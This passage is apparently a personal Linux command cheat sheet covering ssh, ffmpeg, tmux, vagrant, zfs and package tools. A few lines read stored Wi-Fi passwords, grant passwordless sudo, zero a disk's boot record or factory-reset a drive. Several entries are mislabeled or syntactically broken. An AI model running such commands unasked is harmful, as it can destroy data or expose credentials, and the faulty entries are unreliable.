  shares all the files in the current folder over HTTP.
* 'ssh -R 12345:localhost:22 -N server.com' forwards server.com's port 12345
  to your local ssh port, even if you machine is behind a firewall/NAT.
  'ssh localhost -p 12345' from server.com will get you in your machine.
* Read on 'ssh-agent' to strenghten your ssh connections using private keys,
  while avoiding typing passwords every time you ssh.
- 'socat TCP4-LISTEN:1234,fork TCP4:192.168.1.1:22' forwards your port
  1234 to another machine's port 22. Very useful for quick NAT redirection.
- Some tools to monitor network connections and bandwith:
  'lsof -i' monitors network connections in real time
  'iftop' shows bandwith usage per *connection*
  'nethogs' shows the bandwith usage per *process*
* Use this trick on .ssh/config to directly access 'host2' which is on a private
  network, and must be accessed by ssh-ing into 'host1' first
  Host host2
      ProxyCommand ssh -T host1 'nc %h %p'
      HostName host2
* Pipe a compressed file over ssh to avoid creating large temporary .tgz files
  'tar cz folder/ | ssh server "tar xz"' or even better, use 'rsync'
* ssmtp can use a Gmail account as SMTP and send emails from the command line.
  'echo "Hello, User!" | mail user@domain.com' ## Thanks to Adam Ziaja.
  Configure your /etc/ssmtp/ssmtp.conf:
      root=***E-MAIL***
      mailhub=smtp.gmail.com:587
      rewriteDomain=
      hostname=smtp.gmail.com:587
      UseSTARTTLS=YES
      UseTLS=YES
      AuthUser=***E-MAIL***
      AuthPass=***PASSWORD***
      AuthMethod=LOGIN
      FromLineOverride=YES

                                     -~-

(CC) by-nc, Carlos Fenollosa <carlos.fenollosa@gmail.com>
Retrieved from http://cfenollosa.com/misc/tricks.txt
Last modified: Mon 13 Feb 2017 09:31:38 CET
Comment5
##==========================================
## learn. BASH tricks
$> w3m -dump http://cfenollosa.com/misc/tricks.txt
##==========================================
## text. Cool diff
$> diff --side-by-side test.txt test2.txt | pager
##==========================================
## Clear master boot record MBR
$> mkfs.ext4 -F -O ^64bit -L 'WDUSB4TB' '/dev/sdc1'
##==========================================
## install. Remove unused kernels
$> apt-get --purge remove $(dpkg --list | egrep -i 'linux-image|linux-headers' | awk '/ii/{ print $2}' | egrep -v "$i"
##==========================================
## text. Write to file without echo to avoid "" and '' problems
$> cat > shell.txt << EOF
$> Your test with imbedded "" and ''
$> EOF
EOF
##==========================================
## web. multimedia. Youtube search and play
$> cat > ytfzf.sh << EOF
## Youtube search and play
#Usage: ytfzf.sh <search query>
#     -h                    Show this help text
#     -H                    Choose from history
#     -D                    Delete history
#     -m  <search query>    Audio only (for listening to music)
#     -d  <search query>    Download to current directory
#     -f  <search query>    Show available formats before proceeding
#!/bin/sh
[ -z "$*" ] || curl "https://www.youtube.com/results" -s -G --data-urlencode "search_query=$*" |  pup 'script' | grep  "^ *var ytInitialData" | sed $> 's/^[^=]*=//g;s/;$//' | jq '..|.videoRenderer?' | sed '/^null$/d' | jq '.title.runs[0].text,.longBylineText.runs[$> 0].text,.shortViewCountText.simpleText,.lengthText.simpleText,.publishedTimeText.simpleText,.videoId'| sed 's/^"//;s/"$//;s/\\"//g' | sed -E -n $> "s/(.{60}).*/\1/;N;s/\n(.{30}).*/\n\1/;N;N;N;N;s/\n/\t|/g;p" | column -t  -s "$(printf "\t")" | fzf --delimiter='\|' --nth=1,2  | sed -E $> 's_.*\|([^|]*)$_https://www.youtube.com/watch?v=\1_' | xargs -r -I'{}' mpv {}
EOF
##==========================================
## os. Clear the MBR
$> sudo dd if=/dev/zero of=/dev/sdb bs=512 count=1
##==========================================
## multimedia. Pulse Effects large array of audio effects and filters to apply to input and output audio streams
$> firefox https://github.com/wwmm/pulseeffects
$> sudo add-apt-repository ppa:mikhailnov/pulseeffects
$> sudo apt update
$> sudo apt install pulseeffects pulseaudio --install-recommends
##==========================================
## os. VM Win10
## IEUser:Passwr0rd!
$> firefox https://isoriver.com
$> wget https://az792536.vo.msecnd.net/vms/VMBuild_20190311/VirtualBox/MSEdge/MSEdge.Win10.VirtualBox.zip
## Also see
$> firefox https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/
##==========================================
## os. Find me a Linux Distro
## Discover new Linux distribution with a single click
$> firefox https://www.fmald.net/
##==========================================
## multimedia. rembg removes backgrounds from images
$> firefox https://github.com/danielgatis/rembg
##==========================================
## git. Change Git Remote URL
## In order to change the URL of a Git remote, you have to use the “git remote set-url” command and specify the name of the remote as well as the new remote URL to be changed.
$> git remote set-url <remote_name> <remote_url>
## For example, let’s say that you want to change the URL of your Git origin remote.
## In order to achieve that, you would use the “set-url” command on the “origin” remote and you would specify the new URL.
$> git remote set-url origin git@github.com:$USER/LinuxCommands.git
##==========================================
## files. Get the path without the name of the program. Terraform as an example.
$> tfPath=$(which terraform | rev | cut -d'/' -f2- | rev)
$> echo $tfPath
##==========================================
## multimedia. video. Cut a video.
$> ffmpeg -ss 0:23:10.5 -to 0:24:40 -i "input.mkv" -vf "subtitles=input.mkv" -c:v libx264 -c:a aac output.mp4
##==========================================
## script. shell. Quick ref for for/do/done commands
$> for i in {01..10}; do <COMMAND> <BLA>$i; done
##==========================================
## os. linux on floppy
$> firefox https://bits.p1x.in/floppinux-an-embedded-linux-on-a-single-floppy/
## files. ploterific is a command line program meant for a quick and easy way to plot tabular data from the command line.
$> firefox https://github.com/GregorySchwartz/ploterific
## os. Lightning fast Linux init
$> firefox https://github.com/Sweets/hummingbird/
##==========================================
## web. html. Replacement of reserved charactors in html URLs
<< comment3
#Character   Percent encoding
$>    blank space   %20
$>    "             %22
$>    #             %23
$>    %             %25
$>    &             %26
$>    ,             %2C
$>    /             %2F
$>    :             %3A
$>    =             %3D
$>    ?             %3F
$>    \             %5C
comment3
##==========================================
## gui. youtube-dl gui
$> sudo add-apt-repository ppa:mordec13/youtubedl-gui
$> sudo apt-get update && sudo apt-get install youtubedl-gui
##==========================================
## text. app. Sublime text editor
## Sublime Text is a proprietary cross-platform source code editor with a Python application programming interface. It natively supports many programming languages and markup languages, and functions can be added by users with plugins, typically community-built and maintained under free-software licenses.
$> wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -
$> echo "deb https://download.sublimetext.com/ apt/stable/" | sudo tee /etc/apt/sources.list.d/sublime-text.list
$> sudo apt-get update
$> sudo apt-get install sublime-text
##==========================================
## os. macos-big-sur
$> firefox https://apps.apple.com/us/app/macos-big-sur/id1526878132?mt=12%3Fmt%3D12
$> firefox https://macdaddy.io/install-disk-creator/
$> firefox https://www.macworld.com/article/234409/how-to-create-a-bootable-macos-big-sur-installer-drive.html
##==========================================
## cloud. onedrive
$> firefox https://www.linuxuprising.com/2020/02/how-to-keep-onedrive-in-sync-with.html
$> sudo add-apt-repository ppa:yann1ck/onedrive
$> sudo apt-get update
$> sudo apt-get install onedrive
$> onedrive
$> onedrive --synchronize --verbose --dry-run
$> onedrive --synchronize
##==========================================
## os. iso. make iso image
$> mkisofs -o movies.iso /home/username/folder-name
##-------------------------------
## os. iso. Pack the ISO.
$> xorriso -as mkisofs -r \
$>   -V 'Ubuntu 22.04 LTS AUTO (EFIBIOS)' \
$>   -o ../ubuntu-22.04-autoinstall.iso \
$>   --grub2-mbr ../BOOT/1-Boot-NoEmul.img \
$>   -partition_offset 16 \
$>   --mbr-force-bootable \
$>   -append_partition 2 28732ac11ff8d211ba4b00a0c93ec93b ../BOOT/2-Boot-NoEmul.img \
$>   -appended_part_as_gpt \
$>   -iso_mbr_part_type a2a0d0ebe5b9334487c068b6b72699c7 \
$>   -c '/boot.catalog' \
$>   -b '/boot/grub/i386-pc/eltorito.img' \
$>     -no-emul-boot -boot-load-size 4 -boot-info-table --grub2-boot-info \
$>   -eltorito-alt-boot \
$>   -e '--interval:appended_partition_2:::' \
$>   -no-emul-boot \
$>   .
##==========================================
## Compare hex dumps
$> diff <(xxd file1) <(xxd file2)
##==========================================
## Batch-Convert text file containing youtube links to mp3
$> cat playlist.txt | while read line; do youtube-dl --extract-audio --audio-format mp3 -o "%(title)s.%(ext)s" ytsearch:"$line" ;done
##==========================================
## Show current network interface in use
$> ip addr | awk '/state UP/ {print $2}' | sed 's/.$//'
##==========================================
## scan multiple log subdirectories for the latest log files and tail them
$> ls /var/log/* -ld | tr -s " " | cut -d" " -f9 | xargs -i{} sh -c 'echo "\n---{}---\n"; tail -n50 {}/ ls -tr {} | tail -n1'
##==========================================
## Finding the fingerprint of a given certificate
$> openssl x509 -in cert.pem -fingerprint -noout
##==========================================
## Compute newest kernel version from Makefile on Torvalds git repository
## Get newest kernel version by parsing the most bleeding-edge Makefile possible. Useful for doing things like writing live ebuilds and/or self-updating PKGBUILDs for testing purposes. Breakdown: * wget -qO - https://raw.githubusercontent.com/torvalds/linux/master/Makefile — retrieve Makefile and pipe to stdout * head -n5 — only the first 5 lines are relevant, thats where all the version variables are grep -E '\ \=\ [0-9]{1,}' — version variables always have an equals sign followed by a number * cut -d' ' -f3 — extract the individual numbers from the version variables * tr '\n' '.' — replace newlines with periods * sed -e "s/\.$//" — remove trailing period Show Sample Output
$> wget -qO - https://raw.githubusercontent.com/torvalds/linux/master/Makefile | head -n5 | grep -E '\ \=\ [0-9]{1,}' | cut -d' ' -f3 | tr '\n' '.' | sed -e "s/\.$//"
##==========================================
## shell. permissions. Run entire shell script as root
## Placing sudo in the shebang line of a shell script runs the entire thing as root.
$> echo '#!/usr/bin/sudo /bin/bash' > script.sh
##------------------------------------------
## shell. permissions. Run entire shell script as root
## shell. permissions. Placing sudo in the shebang line of a shell script runs the entire thing as root.
$> sed "1i\
$> #!/usr/bin/sudo /bin/bash" file_name.sh > new_filename.sh
##==========================================
## os. app. package. Save a copy of all debian packages in the form in which they are installed and configured on your system
## A copy of all installed debian packages on your system will be put back together, with all changes in configuration files you made and placed in the current directory. Make sure you have enough disk space (say 2-3 GB). Break any time with Ctrl+C. Show Sample Output
$> for a in $(sudo dpkg --get-selections|cut -f1); do dpkg-repack $a|awk '{if (system("sleep .5 && exit 2") != 2) exit; print}';done
##==========================================
## files. python. Code to check if a module is used in python code
$> find . -name "*.ipynb" -exec grep -l "symspellpy" {} \;
##==========================================
## files. Individually 7zip all files in current directory
$> for i in *.*; do 7z a "$i".7z "$i"; done
##==========================================
## files. Moving large number of files
## if you want to move with command mv large list of files than you would get following error /bin/mv: Argument list too long alternavite with exec: find /source/directory -mindepth 1 -maxdepth 1 -name '*' -exec mv {} /target/directory \; Show Sample Output
$> find /source/directory -mindepth 1 -maxdepth 1 -name '*' -print0 | xargs -0 mv -t /target/directory;
##==========================================
## multimedia. video. Rename all subtitles files with the same name of mp4 files in same folder
## Use this command if you want to rename all subtitles for them to have the same name as the mp4 files. NOTE: The order of "ls -1 *.mp4" must match the order of "ls -1 *.srt", run the command bellow to make sure the *.srt files will really match the movies after run this command: paste -d:
$> paste -d: <(ls -1 *.mp4) <(ls -1 *.srt) | while read line; do movie="${line%%:*}"; subtitle="${line##*:}"; mv "${subtitle}" "${movie%.*}.srt"; done
##==========================================
## os. files. tree command limit depth for recursive directory list
## sometimes I need list from path with max limit for recursive depth directory listing
$> tree -L 2 -u -g -p -d
##==========================================
## hardware. os. info. Find out how much ram memory has your video (graphic) card
$> glxinfo |grep -i -o 'device|memory\|[0-9]\{1,12\} MB'|head -n 1
##==========================================
## os. files. List all accessed configuration files while executing a program in linux terminal (improved version)
## Last listed files presumably have higher precedency then files listed first, i.e. configuration files in the personal .config directory will be listed last and their config parameters will be more authoritative then default config parameters defined in /etc directory which are usually listed above them. If you replace ".conf" with ".ini" in the command, initial files will be listed instead of config files. If you do not like to list multiple access to the same config file, pipe to "uniq" or "uniq -c" to prefix lines by the number of occurrences Show Sample Output
$> strace 2>&1 <any_executable> |egrep -o "\".*\.conf\""
##==========================================
## os. Boooted as EFI/UEFI or BIOS
$> [[ -d "/sys/firmware/efi" ]] && echo "UEFI" || echo "BIOS"
##==========================================
## git. Delete all local git branches that have been merged and deleted from remote
$> git branch -d $( git branch -vv | grep '\[[^:]\+: gone\]' | awk '{print $1}' | xargs )
##==========================================
## os. packagemanager. Get all upgradable deb packages in a single line
## Works for debian and ubuntu based distros. Show Sample Output
$> apt list --upgradable | grep -v 'Listing...' | cut -d/ -f1 | tr '\r\n' ' ' | sed '$s/ $/\n/'
##==========================================
## os. gui. Get info about a gui window
$> xwininfo
## Make window transparent (50% opacity) in Gnome shell
## Click window to change its opacity. Source: https://unix.stackexchange.com/a/494289
$> xprop -format _NET_WM_WINDOW_OPACITY 32c -set _NET_WM_WINDOW_OPACITY 0x7FFFFFFF
##------------------------------------------
## os. gui. Make window transparent (50% opacity) in Gnome shell
##     0x7FFFFFFF - 50% opacity
##     0xFFFFFFFF - 100% opacity
## Click window to change its opacity. Source: https://unix.stackexchange.com/a/494289
$> xprop -format _NET_WM_WINDOW_OPACITY 32c -set _NET_WM_WINDOW_OPACITY 0x7FFFFFFF
## Set opacity via providing window id (obtained from xwininfo):
$> xprop -id 0x3a00006 -format _NET_WM_WINDOW_OPACITY 32c -set _NET_WM_WINDOW_OPACITY 0x7FFFFFFF
##==========================================
## shell. Countdown Clock
## I find the other timers are inaccurate. It takes some microseconds to perform the date function. Therefore, using date/time math to calculate the time for us results in millisecond accuracy. This is tailored to the BusyBox date function. May need to change things around for GNU date function. Show Sample Output
$> let T=$(date +%s)+3*60;while [ $(date +%s) -le $T ]; do let i=$T-$(date +%s); echo -ne "\r$(date -d"0:0:$i" +%H:%M:%S)"; sleep 0.3; done
##==========================================
## os. Write a bootable Linux .iso file directly to a USB-stick
## Writes hybrid ISO directly to USB stick; replace /dev/sdb with USB device in question and the ISO image link with the link of your choice
$> wget -O /dev/sdb https://cdimage.ubuntu.com/daily-live/current/eoan-desktop-amd64.iso
##==========================================
## files. Check difference between two file directories recursively
$> diff <(tree /dir/one) <(tree /dir/two)
##==========================================
## multimedia. video. Rotate a video file by 90 degrees CW
## Change video orientation in metadata only
$> ffmpeg -i in.mov -c copy -metadata:s:v:0 rotate=90 out.mov
## Rotate a video file by 90 degrees CW
## Transpose parameter: 0 = 90CounterCLockwise and Vertical Flip (default) 1 = 90Clockwise 2 = 90CounterClockwise 3 = 90Clockwise and Vertical Flip
$> ffmpeg -i in.mov -vf "transpose=1" out.mov
##==========================================
## networking. ssh. SSH connection through host in the middle
$> ssh -J user@reachable_host user@unreacheable_host
##==========================================
## os. shell. permissions. Using a single sudo to run multiple && arguments
## Bash here string
$> sudo -s <<< 'apt update -y && apt upgrade -y'
##==========================================
## os. shell. bash test check validate if variable is number
## to test check if given variable is a digit / number Show Sample Output
$> varNUM=12345; re='^[0-9]+$'; if ! [[ $varNUM =~ $re ]] ; then echo "error: Not a number"; fi
##==========================================
## os. iso. iso to USB with dd and show progress status
## Does the same but shows nicely progress in real time with correct Size in %. But also needs the packages sudo,dd,pv and dialog.
$> image="file.iso";drive="/dev/null";sudo -- sh -c 'cat '"${image}"'|(pv -n -s $(stat --printf="%s" '"${image}"')|dd of='"${drive}"' obs=1M oflag=direct) 2>&1| dialog --gauge "Writing Image '"${image}"' to Drive '"${drive}"'" 10 70 7'
##==========================================
## os hardware. Trim disk image for best compression before distributing
## fstrim is usually used on SSDs but can also be used to remove useless bits from file system images. This is most helpful if the compressed disk image is intended to be distributed, since it will be smaller than an untrimmed compressed image. Show Sample Output
$> kpartx -av disk.img && mkdir disk && mount /dev/mapper/loop0p1 disk && fstrim -v disk && umount disk && kpartx -d disk.img
##==========================================
## os. hardware. Visual alert with keyboard LEDs
$> for a in $(seq 16); do xdotool key Num_Lock;sleep .5; xdotool key Caps_Lock;done
##==========================================
## files. draw line separator (using knoppix5 idea)
## No need to fork off a process.
$> printf "%.s*" {1..40}; printf "\n"
##==========================================
## files. shell. Listing today’s files only
$> find directory_path -maxdepth 1 -daystart -mtime -1
## or
$> ls -al --time-style=+%D| grep `date +%D`
##==========================================
## files. find all files that have 20 or more MB on every filesystem, change the size and filesystem to your liking
$> find / -type f -size +20000k -exec ls -lh {} \; 2> /dev/null | awk '{ print $NF ": " $5 }' | sort -nrk 2,2
##==========================================
## networking.  wifi. List wifi passwords that has been stored as plain text in NetworkManager
$> sudo grep -H '^psk=' /etc/NetworkManager/system-connections/*
##==========================================
## hardware. Factory reset your harddrive. (BE CAREFUL!)
$> hdparm --yes-i-know-what-i-am-doing --dco-restore /dev/sdX
##==========================================
## files. extract column from csv file
$> cut -d"," -f9
##==========================================
## files. shell. colorize sequences numbers
## Credits go to Flatcap https://www.commandlinefu.com/commands/by/flatcap
$> echo abcd89efghij340.20kl|grep --color -e "[0-9]\+" -e "$"
##==========================================
## hardware. info. packagemanager. rough estimate about how much disk space is used by all the currently installed debian packages
## The vaule is expressed in megabytes Show Sample Output
$> echo $[ ($(dpkg-query -s $(dpkg --get-selections | grep -oP '^.*(?=\binstall)') | grep -oP '(?<=Installed-Size: )\d+' | tr '\n' '+' | sed 's/+$//')) / 1024 ]
##==========================================
## info. packagemanager. get the full description of a randomly selected package from the list of installed packages on a debian system
## Put this command on my ~/.bashrc in order to learn something new about installed packages on my Debian/Ubuntu system each time I open a new terminal Show Sample Output
$> dpkg-query --status $(dpkg --get-selections | awk '{print NR,$1}' | grep -oP "^$( echo $[ ( ${RANDOM} % $(dpkg --get-selections| wc -l) + 1 ) ] ) \K.*")
##==========================================
## web. files. html. Download all recently uploaded pastes on pastebin.com
$> elinks -dump https://pastebin.com/archive|grep https|cut -c 7-|sed 's/com/com\/raw/g'|awk 'length($0)>32 && length($0)<35'|grep -v 'messages\|settings\|languages\|archive\|facebook\|scraping'|xargs wget
##==========================================
## web. files. html. Remove scripts tags from *.html and *.htm files under the current directory
$> find ./ -type f \( -iname '*.html' -or -iname '*.htm' \) -exec sed -i '/<script/,/<\/script>/d' '{}' \;
##==========================================
## multimedia. web. Listen YouTube radios streaming
## Listen YouTube radios streaming. I use it on an alias to easily enter kinda flow state for study/programming. Show Sample Output
$> streamlink --player="cvlc --no-video" "https://www.youtube.com/freecodecamp/live" 144p | & tee /dev/null
##==========================================
## networking. Network Discover in a one liner
$> nmap -sn 192.168.1.0/24 -oG - | awk '$4=="Status:" && $5=="Up" {print $0}'|column -t
##==========================================
## ssh. keys. SSH Copy ed25519 key into your host
$> ssh-copy-id -i your-ed25519-key user@host
##==========================================
## web. Youtube URL
$> /\s*[a-zA-Z\/\/:\.]*youtu(be.com\/watch\?v=|.be\/)([a-zA-Z0-9\-_]+)([a-zA-Z0-9\/\*\-\_\?\&\;\%\=\.]*)/i
##==========================================
## multimedia. Play file in mpv.
$> ffmpeg -i file.png -pix_fmt rgb24 -f rawvideo - | mpv -
##==========================================
## https://www.tutorialspoint.com/unix_commands/jpegtran.htm
## multimedia. image. Recursively run all jpg files through jpegtran, losslessly reducing file size by ~10% on average. Change -P2 to however many threads you want to run.
$> find ~/pictures -type f \( -iname "*.jpg" -o -iname "*.jpeg" \) -print0 | xargs -t -P2 -0 -I filename jpegtran -optimize -progressive -copy all -outfile filename filename
##==========================================
## os. permissions. allows you to run any command without having to sudo
$> sudo sh -c "echo '$(id -un) ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
##==========================================
## app. appimage is a standalone package format "one app = one file"
$> https://appimage.github.io/
##==========================================
## #################################
## ##    Vagrant
## #################################
## os. vm. Vagrant
## Use vagrant to test ansible
## Install virtualbox, vagrant, and ansible
## OSX
$> brew cask install virtualbox vagrant
$> brew install ansible
## Linux
$> sudo apt-get install vagrant ansible virtualbox
## Use ad-hoc
$> vagrant init generic/ubuntu2404
$> vagrant up
$> vagrant ssh
## Create a vagrant vm configuration file
$> cat > Vagrantfile << EOF
dev = [
    {'name' => 'server0001.dev.commandline.fun', 'ip' => '192.168.42.101' },
    {'name' => 'server0002.dev.commandline.fun', 'ip' => '192.168.42.102' },
]

os = 'generic/ubuntu1804'

Vagrant.configure("2") do |config|
    dev.each do |host|
        config.vm.define host['name'] do |t|
            t.vm.box = os
            t.vm.hostname = host['name']
            t.vm.network(:private_network, ip: host['ip'])
        end
    end
    config.disksize.size = '15GB'
    config.ssh.insert_key = false
    config.vm.provider "virtualbox" do |v|
      v.memory = 1024
    end
end
EOF

## Start all the VMs
$> vagrant up
## Start one vm
$> vagrant up server0001.dev.commandline.fun
## Check
$> vagrant status
## Run a command to verify
$> vagrant ssh server0001.dev.commandline.fun -c 'echo hello world'
## ssh into vm
$> ssh -o StrictHostKeyChecking=no -i ~/.vagrant.d/insecure_private_key vagrant@192.168.56.101
## Copy over a file, in this case a linux learning file
$> scp -i ~/.vagrant.d/insecure_private_key ./HowtoUseCommandLineInterface_20170725.txt vagrant@192.168.56.101:/home/vagrant/
## Do the learning in the file
## Make a directory on the vm
$> vagrant@server0001:~$ mkdir -p /home/vagrant/Documents
## To stop the VM
## shut it down forcefully
$> vagrant halt
## suspend the virtual machine
$> vagrant suspend
## restart it again,
$> vagrant up
## Remove the vm completely
$> vagrant destroy
## Or
$> vagrant -f destroy
##==========================================
##==========================================
## web. files. Download Large Google Drive files with Wget in Terminal
## Replace FILEID and FILENAME in the command below:
$> wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=FILEID' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=FILEID" -O FILENAME && rm -rf /tmp/cookies.txt
##==========================================
## multimedia. video. capture. use ffmpeg to record a smooth, reasonably sized screencast:
$> cat > screenRecord.sh << EOF
#! /bin/bash
ffmpeg -hide_banner -loglevel error -f x11grab -video_size 1920x1080 -framerate 30 -i :0 -vcodec libx264 -preset ultrafast -qp 0 -pix_fmt yuv444p $1

EOF
$> screenRecord.sh ~/demo.mkv
## This is useless alone. But can be filled in.
$> cat > CheckVid.sh << EOF
#! /bin/bash

if [ -z "$1" ]
  then
    echo "Please specify a valid destination:  screenRecord.sh ~/videos/cast.mkv"
    exit
fi
EOF
##==========================================
## os. ram. Mount a temporary ram partition
## Makes a partition in ram which is useful if you need a temporary working space as read/write access is fast. Be aware that anything saved in this partition will be gone after your computer is turned off.
$> mount -t tmpfs tmpfs /mnt -o size=1024m
##==========================================
## files. jq is insane
$> yt-dlp -J URL >> playlist.json
$> perl -Mdd -MJSON::XS -E '$json=decode_json(do{local $/; <>}); say join "\n", map { $_->[0] } sort { $a->[1] <=> $b->[1] } map { [$_->{playlist_autonumber}." ".$_->{title}, $_->{upload_date} ] } $json->{entries}->@*' playlist.json
##==========================================
## files. encryption. use zfs to encrypt.
## create a dataset called "tank" for /dev/sdb
$> zpool create tank sdb
## create a key
$> openssl rand -out /media/poolkey 32
## create an pool called "encrypted" in dataset "tank"
$> zfs create -o encryption=on -o keyformat=raw -o keylocation=file:///media/poolkey tank/encrypted
## setting the mountpoint
$> mkdir -p /mnt/tank
$> zfs set mountpoint=/mnt/tank second
$> zfs set mountpoint=/mnt/tank/encrypted tank/encrypted
## mount everything
$> zfs mount -a -l
## helpful zfs commands
$> zfs get mountpoint
$> zfs list
$> zpool status
##==========================================
## multimedia. video. 2 minutes of 30fps video (3,600 frames), gop set to 30*30 (each 30 seconds), you can see the video change slightly at each 30 second mark (new i-frame), but otherwise its perfectly still
$> ffmpeg -loop 1 -r 30 -i b10cac207d27ccaf0a2a4d25803c5626.jpg -t 120 -map 0:v:0 -threads 0 -cpu-used 1 -g "30*30" -c:v libvpx -b:v 2M -crf 35 -qmin 25 -qmax 63 -y /tmp/a.webm
##==========================================
## ###############################################
## ##    tmux Sessions
## ###############################################
## -------------------------------------
## shell. multiplex. tmux Sessions
## Misc
$> Ctrl + b :                         ## enter command mode
$>    : set -g OPTION                 ## set OPTION for all sessions
$>    : setw -g OPTION                ## set OPTION for all windows
$>    : set mouse on                  ## enable mouse mode
## Help
$> tmux list-keys                     ## list key bindings(shortcuts)
$>     : list-keys                    ## list key bindings(shortcuts)
$>     Ctrl + b ?                     ## list key bindings(shortcuts)
$> tmux info                          ## show every session, window, pane, etc...
## -------------------------------------
$> tmux                               ## start a new session
$> tmux new                           ## start a new session
$> tmux new-session                   ## start a new session
$>    : new                           ## start a new session
$> tmux new -s mysession              ## start a new session with the name mysession
$>    : new -s mysession              ## start a new session with the name mysession
$> tmux kill-ses -t mysession         ## kill/delete session mysession
$> tmux kill-session -t mysession     ## kill/delete session mysession
$> tmux kill-session -a               ## kill/delete all sessions but the current
$>    Ctrl + b $                      ## rename session
$>    Ctrl + b d                      ## detach from session
$>    : attach -d                     ## detach others on the session (Maximize window by detach other clients)
$> tmux ls                            ## show all sessions
$> tmux list-sessions                 ## show all sessions
$>    Ctrl + b s                      ## show all sessions
$> tmux a -t mysession                ## attach to a session with the name mysession
$> tmux at -t mysession               ## attach to a session with the name mysession
$> tmux attach -t mysession           ## attach to a session with the name mysession
$> tmux attach-session -t mysession   ## attach to a session with the name mysession
$>    Ctrl + b w                      ## preview session and window
$>    Ctrl + b (                      ## move to previous session
$>    Ctrl + b )                      ## move to next session
## -------------------------------------
## Windows
$>    Ctrl + b c                      ## preview session and window
$>    Ctrl + b ,                      ## rename current window
$>    Ctrl + b &                      ## close current window
$>    Ctrl + b p                      ## go to previous window
$>    Ctrl + b n                      ## go to next window
$>    Ctrl + b 0 ... 9                ## switch/select window by number
$>    : swap-window -s 2 -t 1         ## reorder window, swap window number 2 (src) and 1 (dst)
$>    : swap-window -t -1             ## move current window to the left by one position
## -------------------------------------
## Panes
$>    Ctrl + b ;                      ## toggle last active pane
$>    Ctrl + b %                      ## split pane horizontally
$>    Ctrl + b "                      " ## split pane vertically
$>    Ctrl + b {                      ## move the current pane left
$>    Ctrl + b }                      ## move the current pane right
$>    Ctrl + b up-arrow               ## switch to pane to the direction
$>    Ctrl + b down-arrow             ## switch to pane to the direction
$>    Ctrl + b right-arrow            ## switch to pane to the direction
$>    Ctrl + b left-arrow             ## switch to pane to the direction
$>    : setw synchronize-panes        ## toggle synchronize-panes (send command to all panes)
$>    Ctrl + b Spacebar               ## toggle between pane layouts
$>    Ctrl + b o                      ## switch to next pane
$>    Ctrl + b q                      ## show pane numbers
$>    Ctrl + b q 0 ... 9              ## switch/select pane by number
$>    Ctrl + b z                      ## toggle pane zoom
$>    Ctrl + b !                      ## convert pane into a window
$>    Ctrl + b + up-arrow             ## resize current pane height (holding second key is optional)
$>    Ctrl + b Ctrl + up-arrow        ## resize current pane height (holding second key is optional)
$>    Ctrl + b + down-arrow           ## resize current pane height (holding second key is optional)
$>    Ctrl + b Ctrl + down-arrow      ## resize current pane height (holding second key is optional)
$>    Ctrl + b + right-arrow          ## resize current pane width (holding second key is optional)
$>    Ctrl + b Ctrl + right-arrow     ## resize current pane width (holding second key is optional)
$>    Ctrl + b + left-arrow           ## resize current pane width (holding second key is optional)
$>    Ctrl + b Ctrl + left-arrow      ## resize current pane width (holding second key is optional)
$>    Ctrl + b x                      ## close current pane
## -------------------------------------
## Copy mode (vi mode)
$>    : setw -g mode-keys vi          ## use vi keys in buffer
$>    Ctrl + b [                      ## enter copy mode
$>    Ctrl + b PgUp                   ## enter copy mode and scroll one page up
$>    q                               ## quit mode
$>    g                               ## go to top line
$>    G                               ## go to bottom line
$>    up-arrow                        ## scroll up
$>    down-arrow                      ## scroll down
$>    h                               ## move cursor left
$>    j                               ## move cursor down
$>    k                               ## move cursor up
$>    l                               ## move cursor right
$>    w                               ## move cursor forward one word at a time
$>    b                               ## move cursor backward one word at a time
$>    /                               ## search forward
$>    ?                               ## search backward
$>    n                               ## next keyword occurance
$>    N                               ## previous keyword occurance
$>    Spacebar                        ## start selection
$>    Esc                             ## clear selection
$>    Enter                           ## copy selection
$>    Ctrl + v                        ## toggle selection mode: line <-> rectangle
$>    Ctrl + b ]                      ## paste contents of buffer_0
$>    : show-buffer                   ## display buffer_0 contents
$>    : capture-pane                  ## copy entire visible contents of pane to a buffer
$>    : list-buffers                  ## show all buffers
$>    : choose-buffer                 ## show all buffers and paste selected
$>    : save-buffer buf.txt           ## save buffer contents to buf.txt
$>    : delete-buffer -b 1            ## delete buffer_1
## -------------------------------------
## ###############################################
## ##    END tmux Sessions
## ###############################################
##==========================================
## gui. minimize button
## for the icons on the right side
$> gsettings set org.gnome.desktop.wm.preferences button-layout ":minimize,maximize,close"
## for the icons on the left side
$> gsettings set org.gnome.desktop.wm.preferences button-layout "close,minimize,maximize:"
##==========================================
## os. web. install and aсtivate a clean copy of Windows on any PC.
$> firefox https://rentry.org/installwindows
##==========================================
## Static linked-terminal editor
$> firefox
##==========================================
## os. multimedia. mac pci video cam
## As at 8/3/2020 follow the instructions Here.
## They come in two parts, make sure you also follow the ones for your platform.
## They are a bit jumbled on the site so I have included them below.
## Running 18.04 LTS (Bionic) on a 2013 Macbook Pro. The instructions that worked for me were as follows:
$> sudo apt-get install git
$> sudo apt-get install curl xzcat cpio
$> git clone https://github.com/patjak/facetimehd-firmware.git
$> cd facetimehd-firmware
$> make
$> sudo make install
$> cd ..
$> sudo apt-get install kmod libssl-dev checkinstall
$> git clone https://github.com/patjak/bcwc_pcie.git
$> cd bcwc_pcie
$> make
$> sudo make install
$> sudo depmod
$> sudo modprobe -r bdc_pci
$> sudo modprobe facetimehd
$> echo "facetimehd" >> /etc/modules
## Or by hand
$> sudo nano /etc/modules
## **add line "facetimehd", write out (ctl+o) & close**
## I had to install xz-utils instead of xzcat as the latter was not found
##==========================================
## files. sync. transfer the data to multiple destinations with the rsync command using a foe statement.
$> for d in /DESTINATION/PATH_1 /DESTINATION/PATH_2
$> do rsync -options /SOURCE/PATH $d
$> done
##==========================================
## Printing
$> lp -d HP-LaserJet-3050 -n 2 -o Duplex=None -o fit-to-page -o MediaType=stationery-heavyweight -o Quality=High -o PageSize=Custom.4x6in file.pdf
##==========================================
## os. android. Control android
$> firefox https://github.com/Genymobile/scrcpy
##==========================================
## ###################################################
## ##    3D printing
## ###################################################
##==========================================


##==========================================
## ###################################################
